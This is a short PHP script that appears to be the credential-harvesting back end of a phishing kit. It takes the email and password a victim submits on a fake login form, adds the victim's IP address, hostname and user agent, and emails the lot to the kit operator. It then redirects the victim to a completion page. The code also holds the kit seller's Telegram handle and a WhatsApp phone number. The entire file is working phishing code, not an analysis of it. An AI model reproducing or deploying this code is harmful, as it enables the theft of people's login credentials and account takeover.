<?php
if($_POST["email"] != "" and $_POST["pd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------0W'A Info-----------------------\n";
$message .= "Email	            	: ".$_POST['email']."\n";
$message .= "Pa'ssw0rd           	: ".$_POST['pd']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
	$message .= "|------Telegram:@fudsender------|\n";
	$message .= "|------Whatsaap:+7 993 203 11 82------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: complete.php?email=".$_POST['email']);
}else{
header ("Location: index.php");
}

?>